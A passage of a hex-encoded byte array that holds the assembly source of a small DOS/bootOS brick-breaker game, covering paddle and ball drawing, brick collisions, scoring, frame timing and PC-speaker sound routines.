  0x6f, 0x6c, 0x6f, 0x72, 0x0a, 0x09, 0x70, 0x75, 0x73, 0x68, 0x20, 0x64,
  0x69, 0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x09, 0x09, 0x09, 0x3b,
  0x20, 0x44, 0x72, 0x61, 0x77, 0x20, 0x70, 0x61, 0x64, 0x64, 0x6c, 0x65,
  0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x0a, 0x09, 0x73, 0x74, 0x6f,
  0x73, 0x77, 0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x0a, 0x09, 0x73,
  0x74, 0x6f, 0x73, 0x77, 0x0a, 0x09, 0x70, 0x6f, 0x70, 0x20, 0x64, 0x69,
  0x0a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x78, 0x2c, 0x5b, 0x62,
  0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x5d, 0x09, 0x09, 0x3b,
  0x20, 0x44, 0x72, 0x61, 0x77, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x0a, 0x09,
  0x6d, 0x6f, 0x76, 0x20, 0x61, 0x78, 0x2c, 0x5b, 0x62, 0x70, 0x2b, 0x62,
  0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x5d, 0x0a, 0x09, 0x63, 0x61, 0x6c, 0x6c,
  0x20, 0x6c, 0x6f, 0x63, 0x61, 0x74, 0x65, 0x5f, 0x62, 0x61, 0x6c, 0x6c,
  0x09, 0x3b, 0x20, 0x4c, 0x6f, 0x63, 0x61, 0x74, 0x65, 0x20, 0x6f, 0x6e,
  0x20, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6e, 0x0a, 0x09, 0x74, 0x65, 0x73,
  0x74, 0x20, 0x62, 0x79, 0x74, 0x65, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62,
  0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x5d, 0x2c, 0x30, 0x78, 0x38, 0x30, 0x09,
  0x3b, 0x20, 0x59, 0x2d, 0x63, 0x6f, 0x6f, 0x72, 0x64, 0x69, 0x6e, 0x61,
  0x74, 0x65, 0x20, 0x68, 0x61, 0x6c, 0x66, 0x20, 0x66, 0x72, 0x61, 0x63,
  0x74, 0x69, 0x6f, 0x6e, 0x3f, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61,
  0x68, 0x2c, 0x30, 0x78, 0x36, 0x30, 0x09, 0x09, 0x3b, 0x20, 0x49, 0x6e,
  0x74, 0x65, 0x72, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x20, 0x63, 0x6f,
  0x6c, 0x6f, 0x72, 0x73, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x73, 0x6d, 0x6f,
  0x6f, 0x74, 0x68, 0x20, 0x6d, 0x6f, 0x76, 0x2e, 0x0a, 0x09, 0x6a, 0x65,
  0x20, 0x2e, 0x31, 0x32, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x68,
  0x2c, 0x30, 0x78, 0x30, 0x36, 0x0a, 0x2e, 0x31, 0x32, 0x3a, 0x09, 0x6d,
  0x6f, 0x76, 0x20, 0x61, 0x6c, 0x2c, 0x30, 0x78, 0x64, 0x63, 0x09, 0x09,
  0x3b, 0x20, 0x47, 0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x0a, 0x09, 0x6d,
  0x6f, 0x76, 0x20, 0x5b, 0x62, 0x78, 0x5d, 0x2c, 0x61, 0x78, 0x09, 0x09,
  0x3b, 0x20, 0x44, 0x72, 0x61, 0x77, 0x0a, 0x09, 0x70, 0x75, 0x73, 0x68,
  0x20, 0x62, 0x78, 0x0a, 0x09, 0x70, 0x6f, 0x70, 0x20, 0x73, 0x69, 0x0a,
  0x0a, 0x2e, 0x31, 0x34, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62,
  0x78, 0x2c, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78,
  0x5d, 0x09, 0x09, 0x3b, 0x20, 0x42, 0x61, 0x6c, 0x6c, 0x20, 0x70, 0x6f,
  0x73, 0x69, 0x74, 0x69, 0x6f, 0x6e, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20,
  0x61, 0x78, 0x2c, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f,
  0x79, 0x5d, 0x0a, 0x09, 0x61, 0x64, 0x64, 0x20, 0x62, 0x78, 0x2c, 0x5b,
  0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x73, 0x5d, 0x09,
  0x3b, 0x20, 0x41, 0x64, 0x64, 0x20, 0x6d, 0x6f, 0x76, 0x65, 0x6d, 0x65,
  0x6e, 0x74, 0x20, 0x73, 0x70, 0x65, 0x65, 0x64, 0x0a, 0x09, 0x61, 0x64,
  0x64, 0x20, 0x61, 0x78, 0x2c, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c,
  0x6c, 0x5f, 0x79, 0x73, 0x5d, 0x0a, 0x09, 0x70, 0x75, 0x73, 0x68, 0x20,
  0x61, 0x78, 0x0a, 0x09, 0x70, 0x75, 0x73, 0x68, 0x20, 0x62, 0x78, 0x0a,
  0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x6c, 0x6f, 0x63, 0x61, 0x74, 0x65,
  0x5f, 0x62, 0x61, 0x6c, 0x6c, 0x09, 0x3b, 0x20, 0x4c, 0x6f, 0x63, 0x61,
  0x74, 0x65, 0x20, 0x6f, 0x6e, 0x20, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6e,
  0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x6c, 0x2c, 0x5b, 0x62, 0x78,
  0x5d, 0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x61, 0x6c, 0x2c, 0x30, 0x78,
  0x62, 0x31, 0x09, 0x09, 0x3b, 0x20, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x69,
  0x6e, 0x67, 0x20, 0x62, 0x6f, 0x72, 0x64, 0x65, 0x72, 0x73, 0x0a, 0x09,
  0x6a, 0x6e, 0x65, 0x20, 0x2e, 0x33, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20,
  0x63, 0x78, 0x2c, 0x35, 0x34, 0x32, 0x33, 0x09, 0x09, 0x3b, 0x20, 0x31,
  0x31, 0x39, 0x33, 0x31, 0x38, 0x30, 0x20, 0x2f, 0x20, 0x32, 0x32, 0x30,
  0x0a, 0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x73, 0x70, 0x65, 0x61, 0x6b,
  0x65, 0x72, 0x09, 0x09, 0x3b, 0x20, 0x47, 0x65, 0x6e, 0x65, 0x72, 0x61,
  0x74, 0x65, 0x20, 0x73, 0x6f, 0x75, 0x6e, 0x64, 0x0a, 0x09, 0x70, 0x6f,
  0x70, 0x20, 0x62, 0x78, 0x0a, 0x09, 0x70, 0x6f, 0x70, 0x20, 0x61, 0x78,
  0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x62, 0x68, 0x2c, 0x30, 0x78, 0x34,
  0x66, 0x0a, 0x09, 0x6a, 0x65, 0x20, 0x2e, 0x38, 0x0a, 0x09, 0x74, 0x65,
  0x73, 0x74, 0x20, 0x62, 0x68, 0x2c, 0x62, 0x68, 0x0a, 0x09, 0x6a, 0x6e,
  0x65, 0x20, 0x2e, 0x37, 0x0a, 0x2e, 0x38, 0x3a, 0x0a, 0x09, 0x6e, 0x65,
  0x67, 0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62,
  0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x73, 0x5d, 0x09, 0x3b, 0x20, 0x4e, 0x65,
  0x67, 0x61, 0x74, 0x65, 0x20, 0x58, 0x2d, 0x73, 0x70, 0x65, 0x65, 0x64,
  0x20, 0x69, 0x66, 0x20, 0x69, 0x74, 0x20, 0x74, 0x6f, 0x75, 0x63, 0x68,
  0x65, 0x73, 0x20, 0x61, 0x20, 0x73, 0x69, 0x64, 0x65, 0x0a, 0x2e, 0x37,
  0x3a, 0x09, 0x0a, 0x09, 0x74, 0x65, 0x73, 0x74, 0x20, 0x61, 0x68, 0x2c,
  0x61, 0x68, 0x0a, 0x09, 0x6a, 0x6e, 0x7a, 0x20, 0x2e, 0x39, 0x0a, 0x09,
  0x6e, 0x65, 0x67, 0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x62, 0x70,
  0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x73, 0x5d, 0x09, 0x3b, 0x20,
  0x4e, 0x65, 0x67, 0x61, 0x74, 0x65, 0x20, 0x59, 0x2d, 0x73, 0x70, 0x65,
  0x65, 0x64, 0x20, 0x69, 0x66, 0x20, 0x69, 0x74, 0x20, 0x74, 0x6f, 0x75,
  0x63, 0x68, 0x65, 0x73, 0x20, 0x61, 0x20, 0x73, 0x69, 0x64, 0x65, 0x0a,
  0x2e, 0x39, 0x3a, 0x09, 0x6a, 0x6d, 0x70, 0x20, 0x2e, 0x31, 0x34, 0x0a,
  0x0a, 0x2e, 0x33, 0x3a, 0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x61, 0x6c,
  0x2c, 0x30, 0x78, 0x64, 0x66, 0x09, 0x09, 0x3b, 0x20, 0x54, 0x6f, 0x75,
  0x63, 0x68, 0x69, 0x6e, 0x67, 0x20, 0x70, 0x61, 0x64, 0x64, 0x6c, 0x65,
  0x0a, 0x09, 0x6a, 0x6e, 0x65, 0x20, 0x2e, 0x34, 0x0a, 0x09, 0x73, 0x75,
  0x62, 0x20, 0x62, 0x78, 0x2c, 0x64, 0x69, 0x09, 0x09, 0x3b, 0x20, 0x53,
  0x75, 0x62, 0x74, 0x72, 0x61, 0x63, 0x74, 0x20, 0x70, 0x61, 0x64, 0x64,
  0x6c, 0x65, 0x20, 0x70, 0x6f, 0x73, 0x69, 0x74, 0x69, 0x6f, 0x6e, 0x0a,
  0x09, 0x73, 0x75, 0x62, 0x20, 0x62, 0x78, 0x2c, 0x62, 0x79, 0x74, 0x65,
  0x20, 0x34, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x63, 0x6c, 0x2c, 0x36,
  0x09, 0x09, 0x3b, 0x20, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79,
  0x20, 0x62, 0x79, 0x20, 0x36, 0x34, 0x0a, 0x09, 0x73, 0x68, 0x6c, 0x20,
  0x62, 0x78, 0x2c, 0x63, 0x6c, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b,
  0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x73, 0x5d, 0x2c,
  0x62, 0x78, 0x09, 0x3b, 0x20, 0x4e, 0x65, 0x77, 0x20, 0x58, 0x20, 0x73,
  0x70, 0x65, 0x65, 0x64, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x62, 0x61, 0x6c,
  0x6c, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x77, 0x6f, 0x72, 0x64, 0x20,
  0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x73, 0x5d,
  0x2c, 0x30, 0x78, 0x66, 0x66, 0x38, 0x30, 0x09, 0x3b, 0x20, 0x55, 0x70,
  0x64, 0x61, 0x74, 0x65, 0x20, 0x59, 0x20, 0x73, 0x70, 0x65, 0x65, 0x64,
  0x20, 0x66, 0x6f, 0x72, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x0a, 0x09, 0x6d,
  0x6f, 0x76, 0x20, 0x63, 0x78, 0x2c, 0x32, 0x37, 0x31, 0x31, 0x09, 0x09,
  0x3b, 0x20, 0x31, 0x31, 0x39, 0x33, 0x31, 0x38, 0x30, 0x20, 0x2f, 0x20,
  0x34, 0x34, 0x30, 0x0a, 0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x73, 0x70,
  0x65, 0x61, 0x6b, 0x65, 0x72, 0x09, 0x09, 0x3b, 0x20, 0x47, 0x65, 0x6e,
  0x65, 0x72, 0x61, 0x74, 0x65, 0x20, 0x73, 0x6f, 0x75, 0x6e, 0x64, 0x0a,
  0x09, 0x70, 0x6f, 0x70, 0x20, 0x62, 0x78, 0x0a, 0x09, 0x70, 0x6f, 0x70,
  0x20, 0x61, 0x78, 0x0a, 0x09, 0x6a, 0x6d, 0x70, 0x20, 0x2e, 0x31, 0x34,
  0x0a, 0x0a, 0x2e, 0x34, 0x3a, 0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x61,
  0x6c, 0x2c, 0x30, 0x78, 0x64, 0x62, 0x09, 0x09, 0x3b, 0x20, 0x54, 0x6f,
  0x75, 0x63, 0x68, 0x69, 0x6e, 0x67, 0x20, 0x62, 0x72, 0x69, 0x63, 0x6b,
  0x0a, 0x09, 0x6a, 0x6e, 0x65, 0x20, 0x2e, 0x35, 0x0a, 0x09, 0x6d, 0x6f,
  0x76, 0x20, 0x63, 0x78, 0x2c, 0x31, 0x33, 0x35, 0x35, 0x09, 0x09, 0x3b,
  0x20, 0x31, 0x31, 0x39, 0x33, 0x31, 0x38, 0x30, 0x20, 0x2f, 0x20, 0x38,
  0x38, 0x30, 0x0a, 0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x73, 0x70, 0x65,
  0x61, 0x6b, 0x65, 0x72, 0x09, 0x09, 0x3b, 0x20, 0x47, 0x65, 0x6e, 0x65,
  0x72, 0x61, 0x74, 0x65, 0x20, 0x73, 0x6f, 0x75, 0x6e, 0x64, 0x0a, 0x09,
  0x74, 0x65, 0x73, 0x74, 0x20, 0x62, 0x6c, 0x2c, 0x32, 0x09, 0x09, 0x3b,
  0x20, 0x41, 0x6c, 0x69, 0x67, 0x6e, 0x65, 0x64, 0x20, 0x77, 0x69, 0x74,
  0x68, 0x20, 0x62, 0x72, 0x69, 0x63, 0x6b, 0x3f, 0x0a, 0x09, 0x6a, 0x6e,
  0x65, 0x20, 0x2e, 0x31, 0x30, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x59, 0x65,
  0x73, 0x2c, 0x20, 0x6a, 0x75, 0x6d, 0x70, 0x0a, 0x09, 0x64, 0x65, 0x63,
  0x20, 0x62, 0x78, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x41, 0x6c, 0x69, 0x67,
  0x6e, 0x0a, 0x09, 0x64, 0x65, 0x63, 0x20, 0x62, 0x78, 0x0a, 0x2e, 0x31,
  0x30, 0x3a, 0x09, 0x78, 0x6f, 0x72, 0x20, 0x61, 0x78, 0x2c, 0x61, 0x78,
  0x09, 0x09, 0x3b, 0x20, 0x45, 0x72, 0x61, 0x73, 0x65, 0x20, 0x62, 0x72,
  0x69, 0x63, 0x6b, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x78,
  0x5d, 0x2c, 0x61, 0x78, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62,
  0x78, 0x2b, 0x32, 0x5d, 0x2c, 0x61, 0x78, 0x0a, 0x09, 0x69, 0x6e, 0x63,
  0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x73, 0x63,
  0x6f, 0x72, 0x65, 0x5d, 0x09, 0x3b, 0x20, 0x49, 0x6e, 0x63, 0x72, 0x65,
  0x61, 0x73, 0x65, 0x20, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x0a, 0x09, 0x6e,
  0x65, 0x67, 0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x62, 0x70, 0x2b,
  0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x73, 0x5d, 0x09, 0x3b, 0x20, 0x4e,
  0x65, 0x67, 0x61, 0x74, 0x65, 0x20, 0x59, 0x20, 0x73, 0x70, 0x65, 0x65,
  0x64, 0x20, 0x28, 0x72, 0x65, 0x62, 0x6f, 0x75, 0x6e, 0x64, 0x29, 0x0a,
  0x09, 0x70, 0x6f, 0x70, 0x20, 0x62, 0x78, 0x0a, 0x09, 0x70, 0x6f, 0x70,
  0x20, 0x61, 0x78, 0x0a, 0x09, 0x64, 0x65, 0x63, 0x20, 0x77, 0x6f, 0x72,
  0x64, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x72, 0x69, 0x63, 0x6b, 0x73,
  0x5d, 0x09, 0x3b, 0x20, 0x4f, 0x6e, 0x65, 0x20, 0x62, 0x72, 0x69, 0x63,
  0x6b, 0x20, 0x6c, 0x65, 0x73, 0x73, 0x20, 0x6f, 0x6e, 0x20, 0x73, 0x63,
  0x72, 0x65, 0x65, 0x6e, 0x0a, 0x09, 0x6a, 0x6e, 0x65, 0x20, 0x2e, 0x31,
  0x34, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x46, 0x75, 0x6c, 0x6c, 0x79, 0x20,
  0x63, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64, 0x3f, 0x20, 0x4e,
  0x6f, 0x2c, 0x20, 0x6a, 0x75, 0x6d, 0x70, 0x2e, 0x0a, 0x09, 0x6a, 0x6d,
  0x70, 0x20, 0x61, 0x6e, 0x6f, 0x74, 0x68, 0x65, 0x72, 0x5f, 0x6c, 0x65,
  0x76, 0x65, 0x6c, 0x09, 0x3b, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x20,
  0x61, 0x6e, 0x6f, 0x74, 0x68, 0x65, 0x72, 0x20, 0x6c, 0x65, 0x76, 0x65,
  0x6c, 0x0a, 0x0a, 0x2e, 0x35, 0x3a, 0x0a, 0x09, 0x70, 0x6f, 0x70, 0x20,
  0x62, 0x78, 0x0a, 0x09, 0x70, 0x6f, 0x70, 0x20, 0x61, 0x78, 0x0a, 0x2e,
  0x36, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x70, 0x2b,
  0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x5d, 0x2c, 0x62, 0x78, 0x09, 0x09,
  0x3b, 0x20, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x20, 0x62, 0x61, 0x6c,
  0x6c, 0x20, 0x70, 0x6f, 0x73, 0x69, 0x74, 0x69, 0x6f, 0x6e, 0x0a, 0x09,
  0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c,
  0x5f, 0x79, 0x5d, 0x2c, 0x61, 0x78, 0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20,
  0x61, 0x68, 0x2c, 0x30, 0x78, 0x31, 0x39, 0x09, 0x09, 0x3b, 0x20, 0x42,
  0x61, 0x6c, 0x6c, 0x20, 0x65, 0x78, 0x69, 0x74, 0x65, 0x64, 0x20, 0x74,
  0x68, 0x72, 0x6f, 0x75, 0x67, 0x68, 0x20, 0x62, 0x6f, 0x74, 0x74, 0x6f,
  0x6d, 0x3f, 0x0a, 0x09, 0x6a, 0x65, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x5f,
  0x6c, 0x6f, 0x73, 0x74, 0x09, 0x09, 0x3b, 0x20, 0x59, 0x65, 0x73, 0x2c,
  0x20, 0x6a, 0x75, 0x6d, 0x70, 0x0a, 0x09, 0x6a, 0x6d, 0x70, 0x20, 0x67,
  0x61, 0x6d, 0x65, 0x5f, 0x6c, 0x6f, 0x6f, 0x70, 0x09, 0x09, 0x3b, 0x20,
  0x4e, 0x6f, 0x2c, 0x20, 0x72, 0x65, 0x70, 0x65, 0x61, 0x74, 0x20, 0x67,
  0x61, 0x6d, 0x65, 0x20, 0x6c, 0x6f, 0x6f, 0x70, 0x0a, 0x0a, 0x09, 0x3b,
  0x0a, 0x09, 0x3b, 0x20, 0x42, 0x61, 0x6c, 0x6c, 0x20, 0x6c, 0x6f, 0x73,
  0x74, 0x0a, 0x09, 0x3b, 0x20, 0x0a, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x6c,
  0x6f, 0x73, 0x74, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x63, 0x78,
  0x2c, 0x31, 0x30, 0x38, 0x34, 0x36, 0x09, 0x09, 0x3b, 0x20, 0x31, 0x31,
  0x39, 0x33, 0x31, 0x38, 0x30, 0x20, 0x2f, 0x20, 0x31, 0x31, 0x30, 0x0a,
  0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x73, 0x70, 0x65, 0x61, 0x6b, 0x65,
  0x72, 0x09, 0x09, 0x3b, 0x20, 0x47, 0x65, 0x6e, 0x65, 0x72, 0x61, 0x74,
  0x65, 0x20, 0x73, 0x6f, 0x75, 0x6e, 0x64, 0x0a, 0x0a, 0x09, 0x6d, 0x6f,
  0x76, 0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x73, 0x69, 0x5d, 0x2c,
  0x30, 0x09, 0x09, 0x3b, 0x20, 0x45, 0x72, 0x61, 0x73, 0x65, 0x20, 0x62,
  0x61, 0x6c, 0x6c, 0x0a, 0x09, 0x64, 0x65, 0x63, 0x20, 0x62, 0x79, 0x74,
  0x65, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x73, 0x5d,
  0x09, 0x3b, 0x20, 0x4f, 0x6e, 0x65, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x20,
  0x6c, 0x65, 0x73, 0x73, 0x0a, 0x09, 0x6a, 0x73, 0x20, 0x2e, 0x31, 0x09,
  0x09, 0x09, 0x3b, 0x20, 0x41, 0x6c, 0x6c, 0x20, 0x66, 0x69, 0x6e, 0x69,
  0x73, 0x68, 0x65, 0x64, 0x3f, 0x20, 0x59, 0x65, 0x73, 0x2c, 0x20, 0x6a,
  0x75, 0x6d, 0x70, 0x0a, 0x09, 0x6a, 0x6d, 0x70, 0x20, 0x61, 0x6e, 0x6f,
  0x74, 0x68, 0x65, 0x72, 0x5f, 0x62, 0x61, 0x6c, 0x6c, 0x09, 0x3b, 0x20,
  0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x61, 0x6e, 0x6f, 0x74, 0x68, 0x65,
  0x72, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x0a, 0x0a, 0x2e, 0x31, 0x3a, 0x09,
  0x63, 0x61, 0x6c, 0x6c, 0x20, 0x77, 0x61, 0x69, 0x74, 0x5f, 0x66, 0x72,
  0x61, 0x6d, 0x65, 0x2e, 0x32, 0x09, 0x3b, 0x20, 0x54, 0x75, 0x72, 0x6e,
  0x20, 0x6f, 0x66, 0x66, 0x20, 0x73, 0x6f, 0x75, 0x6e, 0x64, 0x0a, 0x09,
  0x69, 0x6e, 0x74, 0x20, 0x30, 0x78, 0x32, 0x30, 0x09, 0x09, 0x3b, 0x20,
  0x45, 0x78, 0x69, 0x74, 0x20, 0x74, 0x6f, 0x20, 0x44, 0x4f, 0x53, 0x20,
  0x2f, 0x20, 0x62, 0x6f, 0x6f, 0x74, 0x4f, 0x53, 0x0a, 0x0a, 0x77, 0x61,
  0x69, 0x74, 0x5f, 0x66, 0x72, 0x61, 0x6d, 0x65, 0x3a, 0x0a, 0x2e, 0x30,
  0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x68, 0x2c, 0x30, 0x78,
  0x30, 0x30, 0x09, 0x09, 0x3b, 0x20, 0x52, 0x65, 0x61, 0x64, 0x20, 0x74,
  0x69, 0x63, 0x6b, 0x73, 0x0a, 0x09, 0x69, 0x6e, 0x74, 0x20, 0x30, 0x78,
  0x31, 0x61, 0x09, 0x09, 0x3b, 0x20, 0x43, 0x61, 0x6c, 0x6c, 0x20, 0x42,
  0x49, 0x4f, 0x53, 0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x64, 0x78, 0x2c,
  0x5b, 0x62, 0x70, 0x2b, 0x6f, 0x6c, 0x64, 0x5f, 0x74, 0x69, 0x6d, 0x65,
  0x5d, 0x09, 0x3b, 0x20, 0x57, 0x61, 0x69, 0x74, 0x20, 0x66, 0x6f, 0x72,
  0x20, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x0a, 0x09, 0x6a, 0x65, 0x20,
  0x2e, 0x30, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x70, 0x2b,
  0x6f, 0x6c, 0x64, 0x5f, 0x74, 0x69, 0x6d, 0x65, 0x5d, 0x2c, 0x64, 0x78,
  0x0a, 0x0a, 0x09, 0x64, 0x65, 0x63, 0x20, 0x62, 0x79, 0x74, 0x65, 0x20,
  0x5b, 0x62, 0x70, 0x2b, 0x62, 0x65, 0x65, 0x70, 0x5d, 0x09, 0x09, 0x3b,
  0x20, 0x44, 0x65, 0x63, 0x72, 0x65, 0x61, 0x73, 0x65, 0x20, 0x74, 0x69,
  0x6d, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x6f,
  0x66, 0x66, 0x20, 0x62, 0x65, 0x65, 0x70, 0x0a, 0x09, 0x6a, 0x6e, 0x65,
  0x20, 0x2e, 0x31, 0x0a, 0x2e, 0x32, 0x3a, 0x0a, 0x09, 0x69, 0x6e, 0x20,
  0x61, 0x6c, 0x2c, 0x30, 0x78, 0x36, 0x31, 0x0a, 0x09, 0x61, 0x6e, 0x64,
  0x20, 0x61, 0x6c, 0x2c, 0x30, 0x78, 0x66, 0x63, 0x09, 0x09, 0x3b, 0x20,
  0x54, 0x75, 0x72, 0x6e, 0x20, 0x6f, 0x66, 0x66, 0x0a, 0x09, 0x6f, 0x75,
  0x74, 0x20, 0x30, 0x78, 0x36, 0x31, 0x2c, 0x61, 0x6c, 0x0a, 0x2e, 0x31,
  0x3a, 0x0a, 0x0a, 0x09, 0x72, 0x65, 0x74, 0x0a, 0x0a, 0x09, 0x3b, 0x0a,
  0x09, 0x3b, 0x20, 0x47, 0x65, 0x6e, 0x65, 0x72, 0x61, 0x74, 0x65, 0x20,
  0x73, 0x6f, 0x75, 0x6e, 0x64, 0x20, 0x6f, 0x6e, 0x20, 0x50, 0x43, 0x20,
  0x73, 0x70, 0x65, 0x61, 0x6b, 0x65, 0x72, 0x0a, 0x09, 0x3b, 0x0a, 0x73,
  0x70, 0x65, 0x61, 0x6b, 0x65, 0x72, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x61, 0x6c, 0x2c, 0x30, 0x78, 0x62, 0x36, 0x09, 0x09, 0x3b, 0x20,
  0x53, 0x65, 0x74, 0x75, 0x70, 0x20, 0x74, 0x69, 0x6d, 0x65, 0x72, 0x20,
  0x32, 0x0a, 0x09, 0x6f, 0x75, 0x74, 0x20, 0x30, 0x78, 0x34, 0x33, 0x2c,
  0x61, 0x6c, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x6c, 0x2c, 0x63,
  0x6c, 0x09, 0x09, 0x3b, 0x20, 0x4c, 0x6f, 0x77, 0x20, 0x62, 0x79, 0x74,
  0x65, 0x20, 0x6f, 0x66, 0x20, 0x74, 0x69, 0x6d, 0x65, 0x72, 0x20, 0x63,
  0x6f, 0x75, 0x6e, 0x74, 0x0a, 0x09, 0x6f, 0x75, 0x74, 0x20, 0x30, 0x78,
  0x34, 0x32, 0x2c, 0x61, 0x6c, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61,
  0x6c, 0x2c, 0x63, 0x68, 0x09, 0x09, 0x3b, 0x20, 0x48, 0x69, 0x67, 0x68,
  0x20, 0x62, 0x79, 0x74, 0x65, 0x20, 0x6f, 0x66, 0x20, 0x74, 0x69, 0x6d,
  0x65, 0x72, 0x20, 0x63, 0x6f, 0x75, 0x6e, 0x74, 0x0a, 0x09, 0x6f, 0x75,
  0x74, 0x20, 0x30, 0x78, 0x34, 0x32, 0x2c, 0x61, 0x6c, 0x0a, 0x09, 0x69,
  0x6e, 0x20, 0x61, 0x6c, 0x2c, 0x30, 0x78, 0x36, 0x31, 0x0a, 0x09, 0x6f,
  0x72, 0x20, 0x61, 0x6c, 0x2c, 0x30, 0x78, 0x30, 0x33, 0x09, 0x09, 0x3b,
  0x20, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x20, 0x50, 0x43, 0x20,
  0x73, 0x70, 0x65, 0x61, 0x6b, 0x65, 0x72, 0x20, 0x74, 0x6f, 0x20, 0x74,
  0x69, 0x6d, 0x65, 0x72, 0x20, 0x32, 0x0a, 0x09, 0x6f, 0x75, 0x74, 0x20,
  0x30, 0x78, 0x36, 0x31, 0x2c, 0x61, 0x6c, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x62, 0x79, 0x74, 0x65, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x65,
  0x65, 0x70, 0x5d, 0x2c, 0x33, 0x09, 0x3b, 0x20, 0x44, 0x75, 0x72, 0x61,
  0x74, 0x69, 0x6f, 0x6e, 0x0a, 0x09, 0x72, 0x65, 0x74, 0x0a, 0x0a, 0x09,
  0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x4c, 0x6f, 0x63, 0x61, 0x74, 0x65, 0x20,
